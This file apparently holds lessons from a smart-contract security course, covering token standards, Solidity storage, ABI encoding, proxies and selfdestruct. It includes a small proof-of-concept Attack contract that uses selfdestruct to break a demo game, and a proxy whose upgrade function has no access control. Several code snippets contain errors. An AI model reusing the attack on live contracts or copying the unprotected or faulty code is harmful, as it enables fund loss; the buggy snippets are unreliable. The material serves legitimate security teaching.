          An ERC20 compliant smart contract needs to have certain functions - `name()`, `symbol()`, `decimals()`, to name a few. These functions are called to retrieve information about the token. Furthermore, functionalities such as transferring tokens and checking the balance of tokens must also be included in the smart contract.

          Of course, the ERC20 is not the be-all and end-all. There are several other upgraded token standards, such as the [ERC-677](https://github.com/ethereum/EIPs/issues/677) and the [ERC-777](https://eips.ethereum.org/EIPS/eip-777) that you might want to check out. These other standards provide additional functionality while maintaining full compatibility with the ERC20 standard.

          To sum up, ERC20 tokens are versatile and powerful constructs in the blockchain realm. Whether you wish to create your own token for a DApp, or simply wish to understand the underlying mechanics of various tokens, gaining a strong grasp on ERC20 tokens can undoubtedly open a plethora of avenues for you. Happy learning!
      -
        id: 65635349-225c-4583-b9ad-62bd27930683
        type: new_lesson
        enabled: true
        title: 'What is an ERC721?'
        slug: what-is-erc721
        duration: 6
        video_url: fl00teXY2FM5FsJWEPP5pTDVzPuAxpAxfO44VLT3wnyI
        raw_markdown_url: /routes/security/1-review/6-what-is-erc721/+page.md
        description: 'What is an NFT? Learn the role of ERC-721 in representing unique digital assets on the blockchain.'
        markdown_content: |-
          ---
          title: What is an ERC721/NFT?
          ---

          _Follow along the with the video_

          ---

          The buzz around non-fungible tokens (NFTs) or `ERC721s` lately is becoming impossible to ignore, especially within the spheres of art and blockchain technology. NFTs, originally authored on the Ethereum platform, present a unique form of digital asset that holds the potential to revolutionize the world of art, gaming and beyond. But what exactly are they?

          ## Understanding NFTs

          NFT stands for non-fungible token. Unlike `ERC20` tokens, such as LINK, DAI etc, each NFT is entirely unique, and no two tokens can be interchanged.

          To better understand, let's look at a simple analogy. Think of a dollar bill; it holds the same value as any other dollar out there. You can freely exchange a dollar for another, and their value remains the same. This makes them _fungible_. Contrastingly, an NFT is the complete opposite. It could be likened to a unique Pokemon. Each Pokemon is unique and no two Pikachu's are exactly the same.

          As a more relatable analogy, consider an NFT as a distinct piece of art, trading card, or any other one-of-a-kind item. So to sum up, NFTs are unique, non-interchangeable tokens best thought of as indestructible digital pieces of art with a permanent history detailing their ownership and alterations.

          ## The Many Uses of NFTs

          Although NFTs are mostly associated with art, they extend beyond that. They can be assigned any property, or manipulated in any way you like, thanks to the underlying smart contract technology.

          <div>
          <div style="text-align: center">
              <img src="/security-section-1/6-erc721s/erc721s1.png" style="width: 20%; height: auto;" alt="block fee">
              <img src="/security-section-1/6-erc721s/erc721s2.png" style="width: 21.7%; height: auto;" alt="block fee"> 
              <div style="font-size: 10">An NFT example from <a href="https://opensea.io/assets/ethereum/0x5af0d9827e0c53e4799bb226655a1de152a425a5/7874">Milady</a></div>
          </div>
          </div>

          These unique tokens are deployed on a smart contract platform and can be traded on numerous NFT platforms such as [OpenSea](https://opensea.io/) or [Rarible](https://rarible.com/). While these decentralized marketplaces provide user-friendly interfaces for trading NFTs, one could just as easily buy and sell outside of them.

          ## NFTs: Bridging the Gap for Artists

          Many might find the whole concept of NFTs puzzling. Isn't art meant to be tangible? But consider this: artists often aren't adequately compensated for their work. Their creations get copied and shared with zero attribution; they simply lose ownership. But with NFTs, artists can finally get the recognition, and more importantly, the compensation they deserve.

          > "Having a decentralized royalty mechanism, or some type of mechanism where these artists can get accurately comped for what they're doing, is crucial."

          Yes, NFTs can be a solution to current issues plaguing the art industry by creating an auditable and transparent trail of royalties without the need for any centralized service.

          ## The Role of the ERC721 Standard

          `ERC721`, or the NFT standard, forms the basis of it all. To keep it simple, the main distinction between `ERC721` and `ERC20` tokens is that each `ERC721` token has a unique Token ID, an attribute that indirectly represents the asset linked to that token.

          To illustrate the unique attributes of an asset, let's say a piece of art or a character in a game, NFTs rely on metadata and `Token URIs`. Due to the prohibitively high gas prices on Ethereum, it's quite impractical to store these intricate art pieces directly on the chain.

          ## How Token URIs Work

          The solution? The developers introduced what is known as a `Token URI` in the NFT standard‚Äîa universally unique identifier that provides information about what an asset (or token) looks like, and the attributes of that token. Data storage platforms like IPFS or a centralized API usually provide this `Token URI` through a simple API call.

          The `Token URI` should return data in a preset format, including the name, image location, description, and any other attributes that add to the uniqueness of the token.

          However, storing metadata off-chain does come with its challenges. If the centralized system hosting these assets crashes, every link associated with your NFT is lost. Modern discussions in the NFT world often debate the pros and cons of on-chain metadata versus off-chain metadata. Regardless of the limitations, there's something truly groundbreaking about NFTs, and it's exciting to envision where this technology could lead us.
      -
        id: ce4c93b4-da09-44e7-87a8-340d4e0d36a8
        type: new_lesson
        enabled: true
        title: 'Advanced Solidity Prerequisites'
        slug: advanced-solidity-prerequisites
        duration: 2
        video_url: sF1SqpxJTXlB5ryqqf00oNmxJbXmwtGTtYneI0002DHnbU
        raw_markdown_url: /routes/security/1-review/7-advanced-solidity-prerequisites/+page.md
        description: 'Learn advanced concepts in Solidity, focusing on storage in smart contracts. Delve into how storage works and the role of constants and immutables.'
        markdown_content: |-
          ---
          title: Advanced Solidity Pre-requisites
          ---

          _Follow along the with the video_

          ---

          Let's look at a couple advanced solidity concepts that will be important to understand as you progress through this course.

          ## The Core of Smart Contracts: Storage

          The first advanced feature we'll be covering today is storage in smart contracts. Every smart contract includes this integral element. This critical component is the space allotted to your variables within the contract.

          When you create a state variable within your contract, an individual storage slot is carved out just for that variable.

          It's worth noting, however, that constants or immutable variables do not occupy space in storage. This unique trait is due to their nature of being stored directly within the contract's bytecode.

          To illustrate:

          <img src="/security-section-1/7-advanced-solidity/sol2.png" style="width: 100%; height: auto;" alt="block fee">

          ### Hands-on Learning with Code

          You can see this yourself through a few commands in Foundry. In the above contract, if we use...

          ```bash
          forge inspect Counter storage
          ```

          We'll get a readout of the storage slots in our `Counter` contract which looks like this:

          ```bash
          "storage": [
              {
                "astId": 44623,
                "contract": "src/Counter.sol:Counter",
                "label": "number1",
                "offset": 0,
                "slot": "0",
                "type": "t_uint256"
              },
              {
                "astId": 44625,
                "contract": "src/Counter.sol:Counter",
                "label": "number2",
                "offset": 0,
                "slot": "1",
                "type": "t_uint256"
              },
              {
                "astId": 44630,
                "contract": "src/Counter.sol:Counter",
                "label": "number4",
                "offset": 0,
                "slot": "2",
                "type": "t_uint256"
              }
            ],
          ```

          Notice how the variable `number3` isn't returned. This is because this variable is contained as a constant within the contract's bytecode.

          > Remember, always experiment with code, because it's in the _doing_ that we grasp the most complex concepts!

          ### Wrapping Up with a Video Recap

          The next lesson will be a quick video refresher on storage to get up to speed on the concept and prepare for the harder stuff to come!
      -
        id: 4b6fc572-3728-4858-8396-a22e09e10647
        type: new_lesson
        enabled: true
        title: Storage
        slug: storage
        duration: 5
        video_url: oo6EIQXLzJxP3aySehqbm1xmwKZnBkI4AhH8tvbcdF00
        raw_markdown_url: /routes/security/1-review/8-storage/+page.md
        description: "Gain a comprehensive understanding of storage in Solidity. This lesson covers global variables, the storage data structure, handling dynamic variables, and the role of constant and immutable variables. It also explains the use of the 'memory' keyword for efficient data management."
        markdown_content: |-
          ---
          title: Storage
          ---

          _Follow along the with the video_

          ---

          In this lesson, we are going to discuss some important aspects related to variables in Solidity. Much of what we'll cover is conveniently summarized in the [**Solidity documentation**](https://docs.soliditylang.org).

          ## Understanding Global Variables and Storage

          First and foremost, we need to familiarize ourselves with the concept of `Storage`. In Solidity, when we refer to variables that are global or those that persist over time, we are actually referring to variables that exist in `Storage`.

          <img src="/security-section-1/8-storage/storage1.png" style="width: 100%; height: auto;" alt="block fee">

          Think of `Storage` as a huge array or list that contains all the variables we create in Solidity. When we declare a variable in a contract‚Äîsay a contract named `fundamentalStorage`‚Äîto be a certain value, such as `favoriteNumber`, we're essentially demanding this variable to persist. This persistence is obtained via `Storage`.

          In code this looks like:

          ```js
          contract fundamentalStorage {
              uint favoriteNumber;
          }
          ```

          This `favoriteNumber` variable is stored in the `Storage` and can be called whenever required.

          Now, `Storage` is essentially an array where every variable (and its value) gets slotted into a 32 byte long slot. This is crucial in understanding how Solidity manages memory and data storage. The indexing of these storage slots starts from 0, and increments just like array indexing in most languages.

          ```javascript
          contract fundamentalStorage {
              uint favoriteNumber = 25;
              bool ourBool = true;
          }
          ```

          For instance, if a variable‚Äî`favoriteNumber`‚Äîis assigned the number 25, this number is stored in its bytes implementation `0x19`.

          ## Dealing with Dynamic Variables

          While static variables are straightforward, things get slightly intricate with variables that are of dynamic length or can change length. Variables in the form of dynamic arrays or mapping are stored using some type of hashing function (outlined in the documentation).

          The object itself does take up a storage slot, but it doesn't contain the whole array. Instead, the storage slot contains the length of the array. If we add a new element to the array by calling `myArray.push(222)`, the array's length and the new element are stored at separate locations determined by the hash function.

          ```js
          contract exampleContract {
              uint[] myArray;

              function addToArray(uint _number) public {
                  myArray.push(_number);
              }
          }
          ```

          In the code example above, `myArray.length` is stored in `storage slot [0]`, while the elements within the array (myArray.push(\_number)) are stored at `storage slot [keccak256(0)]`.

          ## Constant and Immutable Variables

          Interesting to note is the fact that constant and immutable variables do not occupy spots in `Storage`. This is because such variables are incorporated within the bytecode of the contract itself. Solidity automatically substitutes any reference to these variables with their declared values.

          ```js
          contract exampleContract {
              uint constant x = 123;
          }
          ```

          In the example above, the constant variable `x` does not occupy a storage slot.

          ## Temporary Variables: Function Scope

          For variables that are declared inside a function, their existence is ephemeral and scoped merely to the span of that function. These variables do not persist inside the contract and are not stored in `Storage`. Instead, they're stashed in a different memory data structure, which deletes them as soon as the function has finished execution.

          ```js
          contract exampleContract{
              function myFunction(uint val) public {
                  uint newVar = val + 5;
              }
          }
          ```

          In this example, `newVar` only exists for the duration of `myFunction`.

          ## Memory Keyword: Necessary for Strings

          Finally, the `memory` keyword. Primarily used with strings, `memory` is needed because strings are dynamically sized arrays. By using this keyword, we tell Solidity that string operations are to be performed not in `Storage`, but in a separate memory location.

          Solidity needs this explicit instruction because arrays and mappings require more space, hence the need to ensure that space is allocated in the appropriate data structure.

          Here's a code snippet using `memory` keyword with string:

          ```javascript
          contract exampleContract{
              function getString() public pure returns (string memory) {
                  return "this is a string!";
              }
          }
          ```

          All of what we've covered here is outlined in detail in the Solidity Documentation. Understanding these concepts and how Solidity handles variables is integral to attaining a deeper understanding of the language and compiler.

          > "Understanding the nitty-gritty of Solidity variables and storage will significantly amplify your solidity coding skills."
      -
        id: 2a197fd8-42ba-4c0b-90c7-0dbb309c7abd
        type: new_lesson
        enabled: true
        title: 'Fallback and Receive'
        slug: fallback-and-receive
        duration: 2
        video_url: gPDUwI529HOhQuW8xGtf5H009LgG702DDHWMtAtxuNG02Y
        raw_markdown_url: /routes/security/1-review/9-fallback-and-receive/+page.md
        description: 'Learn about the fallback and receive functions in Solidity. Investigate how these functions influence smart contract functionality.'
        markdown_content: |-
          ---
          title: Fallback and Receive
          ---

          _Follow along with the video_

          ---

          In the world of Solidity smart contracts, it's important to understand the fallback and receive functions. By default, Solidity smart contracts reject any Ether (ETH) sent to them. In order to enable your contract to accept ETH, we would implement `fallback` and `receive` functions. Let's look at these mose closely.

          ## What are the Fallback and Receive functions?

          These two specific functions - `fallback` and `receive` - enable a contract to accept and react to native ETH sent to it. Both these functions can be made "**external payable**", indicating that they can receive and handle ETH.

          So, how do they function? Here's the core logic to give you a better understanding:

          <div style="text-align: center">
              <img src="/security-section-1/9-fallback-receive/fallback-receive1.png" style="width: 30%; height: auto;" alt="block fee">
          </div>

          To put it simply, consider the case of sending ETH to a smart contract without any data. In such an instance, the `receive` function would be called, resorting to `fallback` if the `receive` function does not exist.

          On the other hand, if there _is_ data, Solidity will skip straight to the `fallback` function, bypassing the `receive` function entirely.

          ## Default Settings in Solidity

          It is worthwhile to note that the `fallback` function may or may not be payable. If the contract lacks a `receive` function and the `fallback` function isn't payable, then the `fallback` function won't be called when you send ETH to the contract.

          ```js
          fallback() external{}
          receive() external payable {}
          ```

          By the same token, a contract that does not contain any of these functions will reject any ETH sent to it. In fact, Solidity will automatically compile this contract to reject ETH - with at least one notable exception we'll go over later.

          ## Deepening Understanding: Encoding

          The next lesson is a clip you might remember from the Foundry Course. We're going to go over encoding and explain how it can be used to call any function on any contract from another contract.

          Let's do it.
      -
        id: 3c15b341-1146-4e78-abfd-fc77d99fae7f
        type: new_lesson
        enabled: true
        title: 'ABI encode'
        slug: abi-encode
        duration: 23
        video_url: f7wx2PhJ2afdUY8Fj02kloU3kFVzR7B0200802vcmVXJano
        raw_markdown_url: /routes/security/1-review/10-abi-encode/+page.md
        description: 'This lesson focuses on ABI (Application Binary Interface) encoding in Solidity, explaining its role in concatenating strings and encoding data into binary. It provides insights into the process of compressing binary data and techniques for multiple data encoding.'
        markdown_content: |-
          ---
          title: Abi.encode & Abi.encodePacked
          ---

          _Follow along with the video_

          ---

          ## Understanding ABI.encode & ABI.encodePacked in Solidity

          ### Introduction

          The topic we're diving into is how to concatenate strings in Solidity, specifically exploring `abi.encode` and `abi.encodePacked`. This is advanced stuff, delving into the low-level workings of Solidity, binary, and opcodes. Remember, it's okay if you don't grasp it all on the first go!

          > Remember: You can find all the code we'll be working with [**here**](https://github.com/PatrickAlphaC/hardhat-nft-fcc/tree/main/contracts/sublesson).

          ### Getting Started

          - **Setting Up:** We'll use Remix for this exploration. Start by creating a new file named `encoding.sol`.

          Your contract should look something like this:

          ```js
          //SPDX-License-Identifier: MIT

          pragma solidity ^0.8.7

          contract Encoding {
              function combineStrings() public pure returns (string memory) {
                  return string(abi.encodePacked("Hi Mom! ", "Miss you."));
              }
          }
          ```

          Compiling this contract and calling the `combineStrings()` function in Remix is going to give us the whole string `"Hi Mom! Miss you."`

          ### Exploring `abi.encode` and `abi.encodePacked`

          - **Understanding Encoding:** We use `abi.encode` and `abi.encodePacked` for encoding strings and other data types into a binary format. In our function above `"Hi Mom!"` and `"Miss you."` are both converted into binary then concatenated. We then typecast the returned binary is a string.

          `encode` and `encodePacked` are examples of globally available methods in Solidity. There's a [**Cheatsheet**](https://docs.soliditylang.org/en/latest/cheatsheet.html) you should checkout with more information and tonnes of examples of these globally available methods and variables.

          > Note: As of `Solidity 0.8.12` you can also use `string.concat(stringA, StringB)` to achieve the same result as our `"Hi Mom!"` example.

          Before getting to deep with encoding, let's take a step back to understand what's happening when we send a transaction.

          ### Compilation Breakdown

          <img src="/security-section-1/10-encoding/encoding1.png" style="width: 100%; height: auto;" alt="block fee">

          As seen in the image above, when we compile a smart contract, the solidity compiler is returning two things `contract.abi` and `contract.bin`. The `abi` you likely remember from previous lessons.

          `Contract.bin` is the binary representation of your contract. This is the actual code that get put on the blockchain.

          We see this binary object in transaction we send to the blockchain. Recall what constitutes a transaction:

          ```js
          tx = {
            nonce: nonce,
            gasPrice: 10000000000,
            gasLimit: 1000000,
            to: null,
            value: 0,
            data: "BINARYGOESHERE",
            chainId: 1337,
          };
          ```

          > Note: When we're deploying a new contract, this is still a transaction on the blockchain, but our `to` property is empty and the `data` field will contain both the `contract init code` and `contract bytecode(binary)`.

          [**Here's**](https://etherscan.io/tx/0x112133a0a74af775234c077c397c8b75850ceb61840b33b23ae06b753da40490) a transaction on etherscan.io with a binary data object you can inspect.

          At first look, the binary data in a transaction looks like chaos. Just a garbled mess of letters and numbers. You may be asking yourself - how does the EVM (Ethereum Virtual Machine) make any sense of these instructions?

          Well ...

          ### Intro to EVM Opcodes

          > Opcodes are the building blocks of EVM instructions. Each opcode represents a specific operation.

          Opcodes are effectively the alphabet of the ethereum machine language. Each pair of characters in the binary object discussed above represents an Opcode with pertains to a specific operation to be performed.

          You can find a list of the EVM Opcodes [**here**](https://www.evm.codes/?fork=shanghai).

          This means that the binary object we pass in our blockchain transactions is ultimately a long list of these operations we're telling the EVM to perform.

          ### Why This Matters

          Until now we've only used `encode` and `encodePacked` to concatenate strings, but in reality these functions are much more powerful. You can encode virtually anything into its binary format.

          - **abi.encode** - returns the binary of the provided argument
          - **abi.encodePacked** - returns the binary of the provided argument, but with stipulation/compression
            - types shorter than 32 bytes are concatenated directly, without padding or sign extension
            - dynamic types are encoded in-place and without the length.
            - array elements are padded, but still encoded in-place

          Read more about [**Non-standard Packed Mode**](https://docs.soliditylang.org/en/latest/abi-spec.html#abi-packed-mode)

          The other side to this whole equation is that we also have the ability to _`decode`_ things.

          <img src="/security-section-1/10-encoding/encoding2.png" style="width: 100%; height: auto;" alt="block fee">

          and finally .. we can even `multiEncode` and `multiDecode`.

          ## <img src="/security-section-1/10-encoding/encoding3.png" style="width: 100%; height: auto;" alt="block fee">

          # Conclusion

          Hopefully this lesson has shed some light on some of the finer details of using encoding functions in solidity and the power they can hold. In the next lesson we'll be looking at how to encode function calls directly.
      -
        id: 8aaefdb7-de7a-47ce-abbd-953fb53bb1c5
        type: new_lesson
        enabled: true
        title: 'Encoding Functions'
        slug: encoding-function
        duration: 6
        video_url: 89KzeB39oMA00iePKhUu02hMA7W1yWJ600yiT7LW7YDKNg
        raw_markdown_url: /routes/security/1-review/11-encoding-function/+page.md
        description: "Learn about ABI encoding and how it's used in the context of low level function calls in Ethereum."
        markdown_content: |-
          ---
          title: Introduction to Enconding Function Calls Directly
          ---

          _Follow along with the video_

          ---

          ## Understanding ABI Encoding

          With the previous lesson's foundation laid, lets look at what encoding is like within the context of sending transactions.

          We know the EVM is looking for this encoded information, this binary _stuff_. And since transactions sent to the blockchain are ultimately compiled down to this binary, what this allows us to do is populate the `Data` property of a transaction with this binary ourselves.

          <div>
          <div style="text-align: center">
              <img src="/security-section-1/11-encoding-function/encoding-function2.png" style="width: 95%; height: auto;" alt="block fee"> 
              <div style="font-size: 10">Remember the properties of a Transaction</div>
          </div>
          </div>

          ### ABI Encoding and Transactions

          When an Ethereum transaction is initiated, it is essentially reduced to binary code. This transformation pertains not just to a contract deployment but also a function call. In both cases - transactions and function calls - the data field holds the key.

          In a contract deployment, the data field contains the contract's binary code. But for a function call, the data field holds the instructions about what data to send and which function to address.

          Let's dive into an example. If we inspect a transaction on Ethereum using Etherscan, you'll notice a field labeled 'Input data.' Within this field, you'll discover a jumble of hexadecimals - this is the encoded function call.

          **Example Input Data**

          ```js
          Function: enterRaffle(...)
          Method ID: 0x2cfcc539
          ```

          This `Method ID`, sometimes referred to as a `function signature`, is an encoding of that particular function, including it's name and argument types.

          This encoded function call in the data field is how the EVM, or any EVM compatible chain, deciphers which function should be executed.

          ### Direct Function Calls

          <img src="/security-section-1/11-encoding-function/encoding-function1.png" style="width: 100%; height: auto;" alt="block fee">

          With our understanding of ABI encoding, the possibilities expand. We're now able to populate the data field of our transactions directly with the binary or hex code corresponding to the desired function call. Remember, when you initially compile your transaction, `data` was a field that existed? This is where that comes into play.

          You may wonder why this ability is any better than directly using the interface or the Application Binary Interface (ABI). However, there could be scenarios when you might only possess the function name or the parameters. You might even want your code to make arbitrary calls, dangling at the edge of advanced programming. This is when knowing how to populate the data field directly becomes pivotal.

          ### Sending the Transactions

          So, how do we transform this understanding into action - how do we populate the data field and then send these custom, data-encoded transactions?

          In solidity, we rely on some low-level keywords - `staticcall` and `call` - to perform this function. `staticcall` and `call` are used for view or pure functions and functions that change the blockchains' state, respectively.

          In these functions, the code that specifies a particular function to execute goes into the parentheses (data field). For instance, in a previous function utilized for our lottery contract,

          ```js
          function withdraw(address recentWinner) public {
              (bool success, ) = recentWinner.call{value: address.(this).balance}("");
              require(success, "Transfer Failed");
          }
          ```

          the `{value: address.(this).balance}` segment updates the transaction's value field while the empty parentheses imply there's no function to call; the transaction merely sends money.

          However, if a function needs to be executed or data should be sent, it can be specified in the parentheses, let's combine this with our previous `Method ID` we got from etherscan.

          ```js
          function enterRaffle(uint256 entryFee) public payable {
              PuppyRaffle puppyRaffle = new PuppyRaffle;
              puppyRaffle.call{value: entryFee}("0x2cfcc539");
          }
          ```

          In the above example, you can see that we're passing the `entryFee` as an argument to the `value` property of the transaction and in the `data` field we are populating the `function signature`. This will tell the EVM, what to call, where and how much to send.

          ### Wrap Up

          To wrap it up, remember that although the realm of Ethereum and EVM might seem overwhelming at first, understanding their machinations, such as ABI encoding, one concept at a time allows you to become an active participant in the blockchain network, enhancing your ability to interact effectively and perform more advanced operations.

          > "The function of good programming is to do the thinking for you, to the extent possible, so that when you're using it, your mind is free to think." - Joshua Bloch
      -
        id: 315ac33d-e452-4aa2-b577-9b72f1f6ace2
        type: new_lesson
        enabled: true
        title: 'Upgradeable contracts'
        slug: upgradeable-contracts
        duration: 1
        video_url: K902iJAEuzYdUJQaaieWgz3yUelOZCZUtSaxpVa2HZB4
        raw_markdown_url: /routes/security/1-review/12-upgradeable-contracts/+page.md
        description: "Explore the design of upgradeable smart contracts using Proxy and Delegate Call. This lesson covers the functionality, applications, and coding techniques of these concepts, crucial for managing contract upgrades while preserving the contract's state."
        markdown_content: |-
          ---
          title: Upgradeable Contracts
          ---

          _Follow along with the video_

          ---

          ## Upgradeable Contracts

          In this section we're going to ask ourselves `what is a proxy?` and `how does delegateCall` work? in an effort to better understand the advantages and disadvantages of upgradeable smart contracts.

          All the code we'll be working with here is available in the Upgrades repo of the Foundry Course, available [**here**](https://github.com/Cyfrin/foundry-upgrades-f23/tree/main).

          ## SmallProxy.sol

          Let's take a look at a simple proxy example:

          ```js
          // SPDX-License-Identifier: MIT

          pragma solidity ^0.8.19;

          import "@openzeppelin/contracts/proxy/Proxy.sol";

          contract SmallProxy is Proxy {
              // This is the keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
              bytes32 private constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

              function setImplementation(address newImplementation) public {
                  assembly {
                      sstore(_IMPLEMENTATION_SLOT, newImplementation)
                  }
              }

              function _implementation() internal view override returns (address implementationAddress) {
                  assembly {
                      implementationAddress := sload(_IMPLEMENTATION_SLOT)
                  }
              }
          }
          ```

          > Note: we're importing `Proxy.sol` from [**openzeppelin**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/Proxy.sol) as a boilerplate proxy for our example.

          ### Preface to Yul

          The contract we're importing here uses a lot of `Yul`.

          > "`Yul` is an intermediate language that can be compiled to bytecode for different backends." - [**Solidity Docs**](https://docs.soliditylang.org/en/latest/yul.html)

          We won't go too deeply into `Yul`, but please read more in the documentation if it interests you. Note, however, even if you're a really advanced user, avoiding the implementation of really low-level calls is preferred. It's much easier to make significant errors, the lower you are in your code.

          ### Proxy.sol - a closer look

          Within our `Proxy.sol` contract, we've got the `_delegate()` function. This function is called by `Proxy.sol`'s `fallback()` function. This means any time our contract received data for a function it doesn't recognize, it's going to call our `_delegate()` function.

          The `_delegate()` function, then sends that data over to some `implementation` contract.

          <img src="/security-section-1/12-upgradeable/upgrades2.png" style="width: 100%; height: auto;" alt="block fee">

          Looking at `SmallProxy.sol` you can see you have these two functions:

          ```js
          function setImplementation(address newImplementation) public {
                  assembly {
                      sstore(_IMPLEMENTATION_SLOT, newImplementation)
                  }
              }

              function _implementation() internal view override returns (address implementationAddress) {
                  assembly {
                      implementationAddress := sload(_IMPLEMENTATION_SLOT)
                  }
              }
          ```

          - **setImplementation()** - changes the implementation contract, effectively allowing a protocol to upgrade.
          - **\_implementation** - reads the location of the implementation contract

          You may also have noticed `bytes32 private constant _IMPLEMENTATION_SLOT = ...` this is the storage slot where we are storing the address of our implementation contract. You can read more about `Standard Proxy Storage Slots` in [**EIP-1967**](https://eips.ethereum.org/EIPS/eip-1967)

          Let's consider a basic implementation contract:

          ```js
          contract ImplementationA {
              uint256 public value;

              function setValue(uint256 newValue) public {
                  value = newValue;
              }
          }
          ```

          Now we ask ourselves `What data needs to be passed to my proxy contract in order to call this function?`

          If you recall from the last lesson, this data being passed is going to be the encoded function signature and any necessary arguments the function requires! We can get this encoding with a couple helper functions added to `SmallProxy.sol`:

          ```js
          // helper function
              function getDataToTransact(uint256 numberToUpdate) public pure returns (bytes memory) {
                  return abi.encodeWithSignature("setValue(uint256)", numberToUpdate);
              }
          ```

          Now let's use a little assembly to read the storage slot this value is set to:

          ```js
          function readStorage() public view returns (uint256 valueAtStorageSlotZero) {
                  assembly {
                      valueAtStorageSlotZero := sload(0)
                  }
              }
          ```

          With that all set up, here's what we'd do next:

          1. deploy both `SmallProxy.sol` and `ImplementationA.sol`
          2. call the `setImplementation()` function on `SmallProxy.sol`, passing it `ImplementationA`'s address as an argument
          3. acquire the data needed for the transaction being sent
             > By passing `777` to our `getDataToTransact()` function we have returned: `0x552410770000000000000000000000000000000000000000000000000000000000000309` this encodes the `function signature` with the passed arguement of `777`.

          When this is passed to our proxy contract, the contract won't recognize the function signature, will call `fallback()` (which calls `_delegate()`) and pass the data to our implementation contract which DOES recognize this data!

          4. Send transaction with the data

          Now, when we call the `readStorage()` function, we can see that the value on our proxy contract has indeed been set to `777`!

          This is a great illustration of how data is routed from our proxy contract to the implementation contract. Let's see what happens when we upgrade things by changing the implementation contract.

          If we deploy a new implementation:

          ```js
          contract ImplementationB {
              uint256 public value;

              function setValue(uint256 newValue) public {
                  value = newValue + 2;
              }
          }
          ```

          ...and subsequently pass this new address to our proxy's `setImplementation()` function...

          ```js
          function setImplementation(address implementationB);
          ```

          When we then pass the same data as before to our proxy contract, we can indeed see this is reaching `implementationB` and we're having returned `newValue +2`!

          <img src="/security-section-1/12-upgradeable/upgrades3.png" style="width: 100%; height: auto;" alt="block fee">

          ---

          ### Wrap up

          Now, with this understanding in hand, it's easy to see the power proxies hold. On one hand, they are very convenient and afford developers some safeguard if things should need to change. On the other - if this process is controlled by a single (or small group) of wallets, this opens the door to some high risk centralization concerns.

          Next, we'll be looking at `selfDestruct` and how it can be used to circumvent intended contract funtionality!
      -
        id: 69e4923d-69e2-4b4e-9856-272cf26ae896
        type: new_lesson
        enabled: true
        title: 'Self Destruct and Review'
        slug: self-destruct
        duration: 10
        video_url: y16ZuIMXnksLcdt7e001joR3NOYorDkw01mkxf6Trp00hc
        raw_markdown_url: /routes/security/1-review/13-self-destruct/+page.md
        description: 'Understand the use and implications of the selfdestruct keyword in Solidity. This lesson explains how selfdestruct can remove contracts and force ETH into specified addresses, a unique behavior with significant impact on contract functionality and security.'
        markdown_content: |-
          ---
          title: Self-destruct
          ---

          _follow along with the video_

          ---

          ## Forever On-chain ... mostly

          The next concept I want you to know is that of the `selfdestruct()` keyword in Solidity. In essence this keyword will destroy, or delete a contract.

          ## The Unique Characteristic of Selfdestruct

          Why `selfdestruct` stands out lies in its exceptional behavior once a contract gets destroyed. Any Ethereum (or ETH) residing within the deleted contract gets automatically ‚Äòpushed‚Äô or ‚Äòforced‚Äô into any address that you specify.

          Under normal circumstances a contract that doesn't contain a receive or fallback function (or some other payable function capable of receiving funds) cannot have ETH sent to it.

          Only through the use of `selfdestruct` can you be permitted to push any Ethereum into such a contract.

          So if ever you‚Äôre hunting for an exploit, or you have identified an attack where you need to force ETH into a contract, `selfdestruct` will be your instrument of choice.

          ## `selfdestruct` in Action

          To get a clear understanding, let‚Äôs put these into practice. Starting with a code base from [Solidity by example](https://solidity-by-example.org/hacks/self-destruct/) - and then carrying it into Remix, we will be able to observe this concept directly in action.

          ```js
          // SPDX-License-Identifier: MIT
          pragma solidity ^0.8.20;

          // The goal of this game is to be the 7th player to deposit 1 Ether.
          // Players can deposit only 1 Ether at a time.
          // Winner will be able to withdraw all Ether.

          /*
          1. Deploy EtherGame
          2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
          2. Deploy Attack with address of EtherGame
          3. Call Attack.attack sending 5 ether. This will break the game
             No one can become the winner.

          What happened?
          Attack forced the balance of EtherGame to equal 7 ether.
          Now no one can deposit and the winner cannot be set.
          */

          contract EtherGame {
              uint public targetAmount = 7 ether;
              address public winner;

              function deposit() public payable {
                  require(msg.value == 1 ether, "You can only send 1 Ether");

                  uint balance = address(this).balance;
                  require(balance <= targetAmount, "Game is over");

                  if (balance == targetAmount) {
                      winner = msg.sender;
                  }
              }

              function claimReward() public {
                  require(msg.sender == winner, "Not winner");

                  (bool sent, ) = msg.sender.call{value: address(this).balance}("");
                  require(sent, "Failed to send Ether");
              }
          }

          contract Attack {
              EtherGame etherGame;

              constructor(EtherGame _etherGame) {
                  etherGame = EtherGame(_etherGame);
              }

              function attack() public payable {
                  // You can simply break the game by sending ether so that
                  // the game balance >= 7 ether

                  // cast address to payable
                  address payable addr = payable(address(etherGame));
                  selfdestruct(addr);
              }
          }

          ```

          Looking closely at the above contracts, we can see that `EtherGame` requires `address(this).balance == targetAmount`. The expectation of the protocol is that any user can only deposit 1ETH and each deposit transaction is checked as a winner.

          Can you think of how we'd break these invariants?

          By leveraging `selfdestruct(payable(address(etherGame)));` on our `Attack` contract, we can force ETH to the `EtherGame` contract that isn't accounted for.

          ```js
          if (balance == targetAmount) {
            winner = msg.sender;
          }
          ```

          By forcing enough ETH to `EtherGame` we can assure the above condition is never met and a winner is never decided!

          ## Conclusion

          The `selfdestruct()` function is powerful. It's one of the only ways to force a contract to receive ETH that it doesn't want and in so doing exists as an attack vector for any protocol not prepared for it.
      -
        id: bb5432c8-381c-4143-9c43-d37769c15557
        type: new_lesson
        enabled: false
        title: 'Fork Tests'
        slug: fork-tests
        duration: 6
        video_url: xIGaLqCsO54VGZN46tCho9Eu1EQVa5P4tZUILwZx60100
        raw_markdown_url: /routes/security/1-review/14-fork-tests/+page.md
        description: 'This final lesson guides you through the process of conducting fork tests, creating a simulated version of the mainnet for testing purposes. It covers the use of tools like Alchemy URL and practical exercises to solidify your understanding of Solidity and smart contract development.'
        markdown_content: |-
          ---
          title: Fork Tests & Congrats!
          ---

          _follow along with the video_

          ---

          ## Forking Mainnet

          Forking is a valuable tool is a developer's box, it effectively takes a reference snapshot at a given block height on the provided chain. In practice, this allows us to interact with protocols as though we were interacting with them on mainnet.

          ## Fork Tests in Foundry

          ```bash
          forge test fork-url $MAINNET_RPC_URL
          ```

          This command in foundry tells the framework to run your tests while referencing a fork of the provided RPC URL, allowing you to interact with mainnet contract locally.

          Another way to fork is within the test contract directly.

